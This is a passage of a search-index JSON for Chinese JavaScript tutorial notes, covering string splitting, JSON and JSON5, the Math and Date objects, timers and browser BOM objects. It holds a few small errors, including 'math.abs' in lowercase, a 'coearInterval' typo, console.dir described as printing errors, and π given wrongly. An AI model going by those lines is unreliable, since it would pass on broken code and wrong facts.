\",\"参数：\",\"参数\",\"描述\",\"separator\",\"可选。字符串或正则表达式，从该参数指定的地方分割 string Object\",\"limit\",\"可选。该参数可指定返回的数组的最大长度。如果设置了该参数，返回的子串不会多于这个参数指定的数组。如果没有设置该参数，整个字符串都会被分割，不考虑它的长度\",\"如果把空字符串 (\\\"\\\") 用作 separator，那么 string Object 中的每个字符之间都会被分割\",\"例：\",\"var str=\\\"How are you doing today?\\\" var n=str.split(\\\" \\\") console.log(n) // ['How', 'are', 'you', 'doing', 'today?'] \",\"var str=\\\"hello\\\" var n=str.split(\\\"\\\") console.log(n) // ['h', 'e', 'l', 'l', 'o'] \"]}]},\"/front-end/javascript-notes/15-JavaScript-Json.html\":{\"title\":\"Json\",\"contents\":[{\"header\":\"1. JSON格式\",\"slug\":\"_1-json格式\",\"contents\":[\"JSON格式（JavaScript Object Notation 的缩写）是一种用于数据交换的文本格式，2001年由 Douglas Crockford 提出，目的是取代繁琐笨重的 XML 格式\",\"相比 XML 格式，JSON 格式有两个显著的优点：\",\"书写简单，一目了然\",\"符合JavaScript原生语法，可以由解释引擎直接处理，不用另外添加解析代码\",\"JSON已经成为各大网站交换数据的标准格式，并被写入标准\",\"每个 JSON 对象就是一个值，可能是一个数组或对象，也可能是一个原始类型的值。总之，只能是一个值，不能是两个或更多的值\",\"JSON 对值的类型和格式有严格的规定：\",\"复合类型的值只能是数组或对象，不能是函数、正则表达式对象、日期对象\",\"原始类型的值只有四种：字符串、数值（必须以十进制表示）、布尔值和null（不能使用NaN, Infinity, -Infinity和undefined）\",\"字符串必须使用双引号表示，不能使用单引号\",\"对象的键名必须放在双引号里面\",\"数组或对象最后一个成员的后面不能加逗号\",\"例：\",\"以下都是合法的 JSON\",\"[\\\"one\\\", \\\"two\\\", \\\"three\\\"] { \\\"one\\\": 1, \\\"two\\\": 2, \\\"three\\\": 3 } {\\\"names\\\": [\\\"张三\\\", \\\"李四\\\"] } [ { \\\"name\\\": \\\"张三\\\"}, {\\\"name\\\": \\\"李四\\\"} ] \",\"以下都是不合法的 JSON\",\"{ name: \\\"张三\\\", 'age': 32 } // 属性名必须使用双引号 [32, 64, 128, 0xFFF] // 不能使用十六进制值 { \\\"name\\\": \\\"张三\\\", \\\"age\\\": undefined } // 不能使用 undefined { \\\"name\\\": \\\"张三\\\", \\\"birthday\\\": new Date('Fri, 26 Aug 2011 07:13:10 GMT'), \\\"getName\\\": function () { return this.name; } } // 属性值不能使用函数和日期对象 \",\"注意：null、空数组和空对象都是合法的 JSON 值\"]},{\"header\":\"2. JSON对象的方法\",\"slug\":\"_2-json对象的方法\",\"contents\":[\"JSON对象是 JavaScript 的原生对象，用来处理 JSON 格式数据\",\"它有两个静态方法：JSON.stringify()和JSON.parse()\"]},{\"header\":\"2.1 JSON.stringify()\",\"slug\":\"_2-1-json-stringify\",\"contents\":[]},{\"header\":\"2.1.1 基本用法\",\"slug\":\"_2-1-1-基本用法\",\"contents\":[\"JSON.stringify()方法用于将一个值转为 JSON 字符串。该字符串符合 JSON 格式，并且可以被JSON.parse()方法还原\",\"JSON.stringify('abc') // \\\"\\\"abc\\\"\\\" JSON.stringify(1) // \\\"1\\\" JSON.stringify(false) // \\\"false\\\" JSON.stringify([]) // \\\"[]\\\" JSON.stringify({}) // \\\"{}\\\" JSON.stringify([1, \\\"false\\\", false]) // '[1,\\\"false\\\",false]' JSON.stringify({ name: \\\"张三\\\" }) // '{\\\"name\\\":\\\"张三\\\"}' \",\"上面代码将各种类型的值，转成 JSON 字符串\",\"注意，对于原始类型的字符串，转换结果会带双引号\",\"JSON.stringify('foo') === \\\"foo\\\" // false JSON.stringify('foo') === \\\"\\\\\\\"foo\\\\\\\"\\\" // true \",\"上面代码中，字符串foo，被转成了\\\"\\\\\\\"foo\\\\\\\"\\\"。这是因为将来还原的时候，内层双引号可以让 JavaScript 引擎知道，这是一个字符串，而不是其他类型的值\",\"JSON.stringify(false) // \\\"false\\\" JSON.stringify('false') // \\\"\\\\\\\"false\\\\\\\"\\\" \",\"上面代码中，如果不是内层的双引号，将来还原的时候，引擎就无法知道原始值是布尔值还是字符串\",\"如果对象的属性是undefined、函数或 XML 对象，该属性会被JSON.stringify()过滤\",\"var obj = { a: undefined, b: function () {} } JSON.stringify(obj) // \\\"{}\\\" \",\"上面代码中，对象obj的a属性是undefined，而b属性是一个函数，结果都被JSON.stringify过滤\",\"如果数组的成员是undefined、函数或 XML 对象，则这些值被转成null\",\"正则对象会被转成空对象\",\"JSON.stringify(/foo/) // \\\"{}\\\" \",\"JSON.stringify()方法会忽略对象的不可遍历的属性\",\"var obj = {} Object.defineProperties(obj, { 'foo': { value: 1, enumerable: true }, 'bar': { value: 2, enumerable: false } }) JSON.stringify(obj) // \\\"{\\\"foo\\\":1}\\\" \",\"上面代码中，bar是obj对象的不可遍历属性，JSON.stringify()方法会忽略这个属性\"]},{\"header\":\"2.1.2 第二个参数\",\"slug\":\"_2-1-2-第二个参数\",\"contents\":[\"JSON.stringify()方法还可以接受一个数组，作为第二个参数，指定参数对象的哪些属性需要转成字符串\",\"var obj = { 'prop1': 'value1', 'prop2': 'value2', 'prop3': 'value3' } var selectedProperties = ['prop1', 'prop2'] JSON.stringify(obj, selectedProperties) // \\\"{\\\"prop1\\\":\\\"value1\\\",\\\"prop2\\\":\\\"value2\\\"}\\\" \",\"上面代码中，JSON.stringify()方法的第二个参数指定，只转prop1和prop2两个属性\",\"这个类似白名单的数组，只对对象的属性有效，对数组无效\",\"JSON.stringify(['a', 'b'], ['0']) // \\\"[\\\"a\\\",\\\"b\\\"]\\\" JSON.stringify({0: 'a', 1: 'b'}, ['0']) // \\\"{\\\"0\\\":\\\"a\\\"}\\\" \",\"上面代码中，第二个参数指定 JSON 格式只转0号属性，实际上对数组是无效的，只对对象有效\",\"第二个参数还可以是一个函数，用来更改JSON.stringify()的返回值\",\"function f(key, value) { if (typeof value === \\\"number\\\") { value = 2 * value } return value } JSON.stringify({ a: 1, b: 2 }, f) // '{\\\"a\\\": 2,\\\"b\\\": 4}' \",\"上面代码中的f函数，接受两个参数，分别是被转换的对象的键名和键值。如果键值是数值，就将它乘以2，否则就原样返回\",\"注意，这个处理函数是递归处理所有的键\",\"var obj = {a: {b: 1}} function f(key, value) { console.log(\\\"[\\\"+ key +\\\"]:\\\" + value) return value; } JSON.stringify(obj, f) // []:[object Object] // [a]:[object Object] // [b]:1 // '{\\\"a\\\":{\\\"b\\\":1}}' \",\"上面代码中，对象obj一共会被f函数处理三次，输出的最后那行是JSON.stringify()的默认输出。第一次键名为空，键值是整个对象obj；第二次键名为a，键值是{b: 1}；第三次键名为b，键值为1\",\"递归处理中，每一次处理的对象，都是前一次返回的值\",\"var obj = {a: 1} function f(key, value) { if (typeof value === 'object') { return {b: 2} } return value * 2 } JSON.stringify(obj, f) // \\\"{\\\"b\\\": 4}\\\" \",\"上面代码中，f函数修改了对象obj，接着JSON.stringify()方法就递归处理修改后的对象obj\",\"如果处理函数返回undefined或没有返回值，则该属性会被忽略\",\"function f(key, value) { if (typeof(value) === \\\"string\\\") { return undefined } return value } JSON.stringify({ a: \\\"abc\\\", b: 123 }, f) // '{\\\"b\\\": 123}' \",\"上面代码中，a属性经过处理后，返回undefined，于是该属性被忽略了\"]},{\"header\":\"2.1.3 第三个参数\",\"slug\":\"_2-1-3-第三个参数\",\"contents\":[\"JSON.stringify()还可以接受第三个参数，用于增加返回的 JSON 字符串的可读性\",\"默认返回的是单行字符串，对于大型的 JSON 对象，可读性非常差。第三个参数使得每个属性单独占据一行，并且将每个属性前面添加指定的前缀（不超过10个字符）\",\"// 默认输出 JSON.stringify({ p1: 1, p2: 2 }) // JSON.stringify({ p1: 1, p2: 2 }) // 分行输出 JSON.stringify({ p1: 1, p2: 2 }, null, '\\\\t') // { // \\\"p1\\\": 1, // \\\"p2\\\": 2 // } \",\"上面例子中，第三个属性\\\\t在每个属性前面添加一个制表符，然后分行显示\",\"第三个属性如果是一个数字，则表示每个属性前面添加的空格（最多不超过10个）\",\"JSON.stringify({ p1: 1, p2: 2 }, null, 2) /* \\\"{ \\\"p1\\\": 1, \\\"p2\\\": 2 }\\\" */ \"]},{\"header\":\"2.2 JSON.parse()\",\"slug\":\"_2-2-json-parse\",\"contents\":[\"JSON.parse()方法用于将 JSON 字符串转换成JavaScript对象\",\"JSON.parse('{}') // {} JSON.parse('true') // true JSON.parse('\\\"foo\\\"') // \\\"foo\\\" JSON.parse('[1, 5, \\\"false\\\"]') // [1, 5, \\\"false\\\"] JSON.parse('null') // null var o = JSON.parse('{\\\"name\\\": \\\"张三\\\"}') o.name // 张三 \",\"如果传入的字符串不是有效的 JSON 格式，JSON.parse()方法将报错\",\"JSON.parse(\\\"'String'\\\") // illegal single quotes // SyntaxError: Unexpected token ILLEGAL \",\"上面代码中，双引号字符串中是一个单引号字符串，因为单引号字符串不符合 JSON 格式，所以报错\",\"JSON.parse()方法可以接受一个处理函数，作为第二个参数，用法与JSON.stringify()方法类似\",\"function f(key, value) { if (key === 'a') { return value + 10 } return value } JSON.parse('{\\\"a\\\": 1, \\\"b\\\": 2}', f) // {a: 11, b: 2} \",\"上面代码中，JSON.parse()的第二个参数是一个函数，如果键名是a，该函数会将键值加上10\"]},{\"header\":\"3. JSON5\",\"slug\":\"_3-json5\",\"contents\":[\"JSON 格式可以说是目前最流行的数据传输格式了，被广泛应用于前后端通信，尤其是在 SPA 应用中，JSON 数据通过 HTTP 协议进行传输，具有体积小、易序列化、可读性好等优点\",\"JSON 虽好，但是仍有两大痛点让开发者苦恼不已：\",\"不能添加注释（这个不能忍）\",\"序列化之后的 key 被加上了双引号（体积变大了）\"]},{\"header\":\"3.1 JSON如何添加注释\",\"slug\":\"_3-1-json如何添加注释\",\"contents\":[\"目前的标准是不能添加注释，如果想添加的话，只能曲线救国了，例如：\",\"{ \\\"----------base----------\\\": \\\"通用模块变量定义\\\", \\\"common\\\": { \\\"object_not_exit\\\": \\\"对象 ${id} 不存在！\\\", \\\"invalid_username_or_password\\\": \\\"用户名或密码错误！\\\" }, \\\"----------sms----------\\\": \\\"短信模块相关变量\\\", \\\"sms\\\": { \\\"template_missing_parameters\\\": \\\"模板缺少变量！\\\", \\\"param_length_limit\\\": \\\"参数超出长度限制！\\\" } } \",\"一般有下面三种方法：\",\"使用约定的 key 作为注释字段： 如以 //，_comment，#####，—--— (# 或 - 的个数自定) 作为注释的 key 等\",\"使用重名 key 作为注释： 即每个 key，使用两次，第1次做注释，第2次做实际属性\",\"使用字段 key 加前缀做注释 key：常用的前缀有 #, _ 等\"]},{\"header\":\"3.2 能否去掉key中的双引号\",\"slug\":\"_3-2-能否去掉key中的双引号\",\"contents\":[\"序列化之后的 key 被加上了双引号\",\"例如：\",\"const obj = { name: 'keliq', age: 12 } console.log(JSON.stringify(obj)) // {\\\"name\\\":\\\"keliq\\\",\\\"age\\\":12} \",\"仔细观察可以发现，对象的 key 是没有双引号的，但是序列化之后，两边都被加上了引号，导致字符数量变多了，那问题就来了：\",\"为什么要给 key 加双引号？\",\"能不能去掉 key 里面的双引号？\",\"历史背景：\",\"在 ECMAScript 3 中，保留字是不能作为对象的 key 的，例如：\",\"{function: 0} // 语法错误 {if: 0} // 语法错误 {true: 0} // 语法错误 \",\"只能给 key 添加双引号或单引号：\",\"{\\\"function\\\": 0} // Ok {\\\"if\\\": 0} // Ok {\\\"true\\\": 0} // Ok \",\"但是在 ES5 之后，保留字也是可以作为 key 的了，因此在不考虑向后兼容的情况下，如果能把 JSON 对象表示成跟 JavaScript 对象一模一样，只是把中间的空格、换行等删掉该多好呀\"]},{\"header\":\"3.3 JSON5解决了什么问题\",\"slug\":\"_3-3-json5解决了什么问题\",\"contents\":[\"它有以下特性：\",\"对象\",\"对象的 key 可以跟 JavaScript 中对象 key 完全一致，末尾可以有一个逗号\",\"数组\",\"末尾可以有一个逗号\",\"字符串\",\"字符串可以用单引号\",\"字符串可以用反引号\",\"字符串可以用转义字符\",\"数字\",\"数字可以是 16 进制\",\"数字可以用点开头或结尾\",\"数字可以表示正无穷、负无穷和NaN\",\"数字可以用加号开头\",\"注释\",\"支持单行和多行注释\",\"空格\",\"允许多余的空格\"]},{\"header\":\"3.4 JSON5的使用\",\"slug\":\"_3-4-json5的使用\",\"contents\":[\"详见官网：JSON5 – JSON for Humans | JSON5\"]}]},\"/front-end/javascript-notes/16-JavaScript-Math.html\":{\"title\":\"Math\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Math 是 JS 的一个内置对象，称为数学对象，提供了一堆的属性和方法帮助我们操作 数字\"]},{\"header\":\"1. 常用方法\",\"slug\":\"_1-常用方法\",\"contents\":[]},{\"header\":\"1.1 random\",\"slug\":\"_1-1-random\",\"contents\":[\"Math.random() 这个方法是用来生成一个 0 ~ 1 之间的随机数，每次执行生成的数字都不一样，但是一定是 0 ~ 1 之间的，生成的数字包含 0 ，但是不包含 1\",\"var num = Math.random() console.log(num) // 得到一个随机数 \",\"//生成0~10的随机数 Math.floor(Math.random() * 11) //生成N~M之间的随机数 Math.floor(Math.random() * (M - N + 1)) + N \"]},{\"header\":\"1.2 round\",\"slug\":\"_1-2-round\",\"contents\":[\"Math.round() 是将一个小数 四舍五入 变成一个整数\",\"var num = 10.1 console.log(Math.round(num)) // 10 var num2 = 10.6 console.log(Math.round(num2)) // 11 \"]},{\"header\":\"1.3 abs\",\"slug\":\"_1-3-abs\",\"contents\":[\"Math.abs() 是返回一个数字的 绝对值\",\"var num = -10 console.log(math.abs(num)) // 10 \"]},{\"header\":\"1.4 ceil\",\"slug\":\"_1-4-ceil\",\"contents\":[\"Math.ceil() 是将一个小数 向上取整 得到的整数\",\"var num = 10.1 console.log(Math.ceil(num)) // 11 var num2 = 10.9 console.log(Math.ceil(num2)) // 11 \"]},{\"header\":\"1.5 floor\",\"slug\":\"_1-5-floor\",\"contents\":[\"Math.floor() 是将一个小数 向下取整 的到的整数\",\"var num = 10.1 console.log(Math.floor(num)) // 10 var num2 = 10.9 console.log(Math.floor(num2)) // 10 \"]},{\"header\":\"1.6 max\",\"slug\":\"_1-6-max\",\"contents\":[\"Math.max() 得到的是你传入的几个数字之中 最大 的那个数字\",\"console.log(Math.max(1, 2, 3, 4, 5)) // 5 \"]},{\"header\":\"1.7 min\",\"slug\":\"_1-7-min\",\"contents\":[\"Math.min() 得到的是你传入的几个数字之中 最小 的那个数字\",\"console.log(Math.min(1, 2, 3, 4, 5)) // 1 \"]},{\"header\":\"1.8 pow\",\"slug\":\"_1-8-pow\",\"contents\":[\"Math.pow()求某个数的多少次方\",\"// 求 4 的 2 次方 console.log(Math.pow(4, 2)) // 16 // 求 2 的 3 次方 console.log(Math.pow(2, 3)) // 8 \"]},{\"header\":\"1.9 sqrt\",\"slug\":\"_1-9-sqrt\",\"contents\":[\"Math.sqrt()求某数的平方根\",\"console.log(Math.sqrt(16))// 4 \"]},{\"header\":\"2. 常用属性\",\"slug\":\"_2-常用属性\",\"contents\":[]},{\"header\":\"2.1 PI\",\"slug\":\"_2-1-pi\",\"contents\":[\"Math.PI 得到的是 π 的值，也就是 3.1415936...\",\"console.log(Math.PI) // 3.141592653589793 \",\"因为计算机的计算精度问题，只能得到小数点后 15 位，使用 Math.PI 的时候，是不需要加 () 的\"]}]},\"/front-end/javascript-notes/17-JavaScript-Date.html\":{\"title\":\"Date\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Date对象是JS提供的专门用来获取时间的\"]},{\"header\":\"1. new Date()\",\"slug\":\"_1-new-date\",\"contents\":[\"new Date() 在不传递参数的情况下是默认返回当前时间\",\"var time = new Date() console.log(time) // 当前时间 Fri Mar 01 2019 13:11:23 GMT+0800 (中国标准时间) \",\"new Date() 在传入参数的时候，可以获取到一个你传递进去的时间\",\"var time = new Date('2019-03-03 13:11:11') console.log(time) // Sun Mar 03 2019 13:11:11 GMT+0800 (中国标准时间) \",\"new Date() 传递的参数有多种情况\",\"传递两个数字，第一个表示年，第二个表示月份\",\"var time = new Date(2019, 00) // 月份从 0 开始计数，0 表示 1月，11 表示 12月 console.log(time) // Tue Jan 01 2019 00:00:00 GMT+0800 (中国标准时间) \",\"传递三个数字，前两个不变，第三个表示该月份的第几天，从 1 到 31\",\"var time = new Date(2019, 00, 05) console.log(time) // Sat Jan 05 2019 00:00:00 GMT+0800 (中国标准时间) \",\"传递四个数字，前三个不变，第四个表示当天的几点，从 0 到 23\",\"var time = new Date(2019, 00, 05, 22) console.log(time) // Sat Jan 05 2019 22:00:00 GMT+0800 (中国标准时间) \",\"传递五个数字，前四个不变，第五个表示的是该小时的多少分钟，从 0 到 59\",\"var time = new Date(2019, 00, 05, 22, 33) console.log(time) // Sat Jan 05 2019 22:33:00 GMT+0800 (中国标准时间) \",\"传递六个数字，前五个不变，第六个表示该分钟的多少秒，从 0 到 59\",\"var time = new Date(2019, 00, 05, 22, 33, 55) console.log(time) // Sat Jan 05 2019 22:33:55 GMT+0800 (中国标准时间) \",\"传入字符串的形式\",\"console.log(new Date('2019')) // Tue Jan 01 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02')) // Fri Feb 01 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03')) // Sun Feb 03 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:')) // Sun Feb 03 2019 13:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:13:')) // Sun Feb 03 2019 13:13:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:13:13')) // Sun Feb 03 2019 13:13:13 GMT+0800 (中国标准时间) \"]},{\"header\":\"2. 将日期字符串格式化成指定内容\",\"slug\":\"_2-将日期字符串格式化成指定内容\",\"contents\":[\"我们得到的时间字符串是 Sun Feb 03 2019 13:13:13 GMT+0800 (中国标准时间)，我只想得到这个日期中是哪一年，我们就要靠截取字符串的形式得到，但是现在 js 为我们提供了一系列的方法来得到里面的指定内容\"]},{\"header\":\"2.1 getFullYear\",\"slug\":\"_2-1-getfullyear\",\"contents\":[\"getFullYear() 方式是得到指定字符串中的哪一年\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getFullYear()) // 2019 \"]},{\"header\":\"2.2 getMonth\",\"slug\":\"_2-2-getmonth\",\"contents\":[\"getMonth() 方法是得到指定字符串中的哪一个月份\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getMonth()) // 3 \",\"这里要有一个注意的地方，月份是从 0 开始数的，0 表示 1月，1 表示 2月，依此类推\"]},{\"header\":\"2.3 getDate\",\"slug\":\"_2-3-getdate\",\"contents\":[\"getDate() 方法是得到指定字符串中的哪一天\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getDate()) // 3 \"]},{\"header\":\"2.4 getHours\",\"slug\":\"_2-4-gethours\",\"contents\":[\"getHours() 方法是得到指定字符串中的哪小时\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getHours()) // 8 \"]},{\"header\":\"2.5 getMinutes\",\"slug\":\"_2-5-getminutes\",\"contents\":[\"getMinutes() 方法是得到指定字符串中的哪分钟\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getMinutes()) // 0 \"]},{\"header\":\"2.6 getSeconds\",\"slug\":\"_2-6-getseconds\",\"contents\":[\"getSeconds() 方法是得到指定字符串中的哪秒钟\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getSeconds()) // 22 \"]},{\"header\":\"2.7 getDay\",\"slug\":\"_2-7-getday\",\"contents\":[\"getDay() 方法是得到指定字符串当前日期是一周中的第几天（周日是 0，周六是 6）\",\"var time = new Date(2019, 03, 08, 08, 00, 22) console.log(time.getDay()) // 1 \"]},{\"header\":\"2.8 getTime\",\"slug\":\"_2-8-gettime\",\"contents\":[\"getTime() 方法是得到执行时间到 格林威治时间 的毫秒数，即时间戳\",\"var time = new Date(2019, 03, 08, 08, 00, 22) console.log(time.getTime()) // 1554681622000 \",\"其他获取时间戳方法：\",\"+new Date() 方法：\",\"console.log(+new Date()) \",\"now() 方法： 无需实例化，但是只能得到当前的时间戳\",\"console.log(Date.now()) \"]},{\"header\":\"3. 获取时间差\",\"slug\":\"_3-获取时间差\",\"contents\":[\"是指获取两个时间点之间相差的时间，在JS中是不能用时间直接做 减法 的，我们需要一些特殊的操作，在编程的世界里面，有一个特殊的时间，是 1970年01月01日00时00分00秒，这个时间我们叫做 格林威治时间，所有的编程世界里面，这个时间都是一样的，而且 格林威治时间 的数字是 0，从 格林威治时间 开始，每经过1毫秒，数字就会 + 1，所以我们可以获取到任意一个时间节点到 `格林威s\"]}]},\"/front-end/javascript-notes/18-JavaScript-%E5%AE%9A%E6%97%B6%E5%99%A8.html\":{\"title\":\"定时器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在 JS 里面，有两种定时器，倒计时定时器 和 间隔定时器\"]},{\"header\":\"1. 倒计时定时器\",\"slug\":\"_1-倒计时定时器\",\"contents\":[\"倒计时多少时间以后执行函数\",\"语法： setTimeout(要执行的函数，多长时间以后执行)\",\"会在你设定的时间以后，执行函数\",\"var timerId = setTimeout(function () { console.log('我执行了') }, 1000) console.log(timerId) // 1 \",\"时间是按照毫秒进行计算的，1000 毫秒就是 1秒钟，所以会在页面打开 1 秒钟以后执行函数，只执行一次，就不再执行了，返回值是当前这个定时器是页面中的第几个定时器，表示定时器的编号\"]},{\"header\":\"2. 间隔定时器\",\"slug\":\"_2-间隔定时器\",\"contents\":[\"每间隔多少时间就执行一次函数\",\"语法： setInterval(要执行的函数，间隔多少时间)\",\"var timerId = setInterval(function () { console.log('我执行了') }, 1000) \",\"时间和刚才一样，是按照毫秒进行计算的，每间隔 1 秒钟执行一次函数，只要不关闭，会一直执行，返回值是，当前这个定时器是页面中的第几个定时器，表示定时器的编号\"]},{\"header\":\"3. 定时器的返回值\",\"slug\":\"_3-定时器的返回值\",\"contents\":[\"设置定时器的时候，它的返回值是部分 setTimeout 和 setInterval 的\",\"只要有一个定时器，那么就是一个数字\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) console.log(timerId) // 1 console.log(timerId2) // 2 \"]},{\"header\":\"4. 关闭定时器\",\"slug\":\"_4-关闭定时器\",\"contents\":[\"我们刚才提到过一个 timerId，是表示这个定时器是页面上的第几个定时器\",\"这个 timerId 就是用来关闭定时器的数字\",\"我们有两个方法来关闭定时器 clearTimeout 和 clearInterval\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) clearTimeout(timerId) \",\"关闭以后，定时器就不会再执行了\",\"var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) coearInterval(timerId2) \",\"关闭以后定时器就不会再执行了\",\"原则上是clearTimeout 关闭 setTimeout，clearInterval 关闭 setInterval，但是其实是可以通用的，他们可以混着使用\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) // 关闭倒计时定时器 clearInterval(timerId) var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) // 关闭间隔定时器 clearTimeout(timerId2) \"]}]},\"/front-end/javascript-notes/19-JavaScript-BOM.html\":{\"title\":\"BOM\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"BOM（Browser Object Model）： 浏览器对象模型\",\"其实就是操作浏览器的一些能力\",\"我们可以操作哪些内容？\",\"获取一些浏览器的相关信息（窗口的大小）\",\"操作浏览器进行页面跳转\",\"获取当前浏览器地址栏的信息\",\"操作浏览器的滚动条\",\"浏览器的信息（浏览器的版本）\",\"让浏览器出现一个弹出框（alert / confirm / prompt）\",\"……\"]},{\"header\":\"1. window对象\",\"slug\":\"_1-window对象\",\"contents\":[\"window 对象是一个全局对象，也可以说是 JavaScript 中的顶级对象，基本 BOM 的属性和方法都是 window 对象\",\"所有通过 var 定义在全局作用域中的变量、函数都会变成 window 对象的属性和方法\",\"window对象下的属性和方法调用的时候可以省略 window\"]},{\"header\":\"1.1 获取浏览器窗口的尺寸\",\"slug\":\"_1-1-获取浏览器窗口的尺寸\",\"contents\":[\" innerHeight 和 innerWidth\",\"这两个方法分别是用来获取浏览器窗口的宽度和高度（包含滚动条的）\",\"var windowHeight = window.innerHeight console.log(windowHeight) var windowWidth = window.innerWidth console.log(windowWidth) \",\"不包含滚动条的尺寸获取方式\",\"document.documentElement.clientWidth ： 可视窗口的宽度\",\"document.documentElement.clientHeight ： 可视窗口的高度\"]},{\"header\":\"1.2 获取元素尺寸\",\"slug\":\"_1-2-获取元素尺寸\",\"contents\":[\"就是获取元素的 \\\"占地面积\\\"，使用document对象\",\"注意:\",\"获取到的尺寸是没有单位的数字\",\"当元素在页面中不占位置的时候， 获取到的是 0 \",\"display: none; 元素在页面不占位\",\"visibility: hidden; 元素在页面占位\"]},{\"header\":\"1.2.1 offsetWith 和 offsetHeight\",\"slug\":\"_1-2-1-offsetwith-和-offsetheight\",\"contents\":[\"offsetWidth ： 获取的是元素 内容 + padding + border 的宽度\",\"offsetHeight ： 获取的是元素 内容 + padding + border 的高度\"]},{\"header\":\"1.2.2 clientWidth 和 clientHeight\",\"slug\":\"_1-2-2-clientwidth-和-clientheight\",\"contents\":[\"clientWidth ： 获取的是元素 内容 + padding 的宽度\",\"clientHeight ： 获取的是元素 内容 + padding 的高度\"]},{\"header\":\"1.3 获取元素的偏移量\",\"slug\":\"_1-3-获取元素的偏移量\",\"contents\":[\"就是元素在页面上相对于参考父级的左边和上边的距离，使用document对象\"]},{\"header\":\"1.3.1 offsetParent\",\"slug\":\"_1-3-1-offsetparent\",\"contents\":[\"获取元素的偏移量参考父级\",\"其实就是假设你要给一个元素 绝对定位 的时候，它是根据谁来进行定位的，那么这个元素的偏移量参考父级就是谁\"]},{\"header\":\"1.3.2 offsetLeft 和 offsetTop\",\"slug\":\"_1-3-2-offsetleft-和-offsettop\",\"contents\":[\"获取的是元素左边的偏移量和上边的偏移量\",\"offsetLeft ： 该元素相对于参考父级的左侧偏移量\",\"offsetTop ： 该元素相对于参考父级的上侧偏移量\"]},{\"header\":\"1.4 浏览器的弹出层\",\"slug\":\"_1-4-浏览器的弹出层\",\"contents\":[\"alert 是在浏览器弹出一个提示框\",\"window.alert('我是一个提示框') \",\"这个弹出层只是一个提示内容，只有一个确定按钮\",\"点击确定按钮以后，这个提示框就消失了\",\"confirm 是在浏览器弹出一个询问框\",\"var boo = window.confirm('我是一个询问框') console.log(boo) \",\"这个弹出层有一个询问信息和两个按钮\",\"当你点击确定的时候，就会得到 true\",\"当你点击取消的时候，就会得到 false\",\"prompt 是在浏览器弹出一个输入框\",\"var str = window.prompt('请输入内容') console.log(str) \",\"这个弹出层有一个输入框和两个按钮\",\"当你点击取消的时候，得到的是 null\",\"当你点击确定的时候得到的就是你输入的内容\"]},{\"header\":\"1.5 控制台对象\",\"slug\":\"_1-5-控制台对象\",\"contents\":[\"可以输出各种信息到控制台，并且还提供了很多有用的辅助方法\",\"console对象的浏览器实现，包含在浏览器自带的开发工具之中。以 Chrome 浏览器的“开发者工具”（Developer Tools）为例，可以按 F12 打开\",\"打开开发者工具以后，顶端有多个面板：\",\"Elements：查看网页的 HTML 源码和 CSS 代码\",\"Resources：查看网页加载的各种资源文件（比如代码文件、字体文件 CSS 文件等），以及在硬盘上创建的各种内容（比如本地缓存、Cookie、Local Storage等）\",\"Network：查看网页的 HTTP 通信情况\",\"Sources：查看网页加载的脚本源码\",\"Timeline：查看各种网页行为随时间变化的情况\",\"Performance：查看网页的性能情况，比如 CPU 和内存消耗\",\"Console：用来运行 JavaScript 命令\",\"console.log方法用于在控制台输出信息\",\"console.dir方法用于在控制台输出错误信息\"]},{\"header\":\"1.6 浏览器的地址信息\",\"slug\":\"_1-6-浏览器的地址信息\",\"contents\":[\"在 window 中有一个对象叫做 location，就是专门用来存储浏览器的地址栏内的信息的\"]},{\"header\":\"1.6.1 location.href\",\"slug\":\"_1-6-1-location-href\",\"contents\":[\"location.href 这个属性存储的是浏览器地址栏内 url 地址的信息\",\"console.log(window.location.href) \",\"会把中文变成 url 编码的格式\",\"location.href 这个属性也可以给它赋值，赋值时用于地址的跳转\",\"window.location.href = './index.html' // 这个就会跳转页面到后面你给的那个地址 \"]},{\"header\":\"1.6.2 location.search\",\"slug\":\"_1-6-2-location-search\",\"contents\":[\"location.search这个属性用于获取地址中携带的参数，符号 ？后面部分\"]},{\"header\":\"1.6.3 location.hash\",\"slug\":\"_1-6-3-location-hash\",\"contents\":[\"location.hash这个属性用于获取地址中的哈希值，符号 # 后面部分\"]},{\"header\":\"1.6.4 location.reload\",\"slug\":\"_1-6-4-location-reload\",\"contents\":[\"location.reload() 这个方法会重新加载一遍页面，就相当于刷新，传入参数 true 时表示强制刷新\",\"window.location.reload() \",\"注意： 不要写在全局，不然浏览器就会一直处在刷新状态\"]},{\"header\":\"1.7 浏览器的历史记录\",\"slug\":\"_1-7-浏览器的历史记录\",\"contents\":[\"window 中有一个对象叫做 history，是专门用来存储历史记录信息的\"]},{\"header\":\"1.7.1 history.back\",\"slug\":\"_1-7-1-history-back\",\"contents\":[\"history.back 是用来回退历史记录的，就是回到前一个页面，就相当于浏览器上的 ⬅️ 按钮\",\"window.history.back() \",\"前提是你要有上一条记录，不然就是一直在这个页面，也不会回退\"]},{\"header\":\"1.7.2 history.forword\",\"slug\":\"_1-7-2-history-forword\",\"contents\":[\"history.forword 是去到下一个历史记录里面，也就是去到下一个页面，就相当于浏览器上的 ➡️ 按钮\",\"window.history.forward() \",\"前提是你要之前有过回退操作，不然的话你现在就是最后一个页面，没有下一个\"]},{\"header\":\"1.7.3 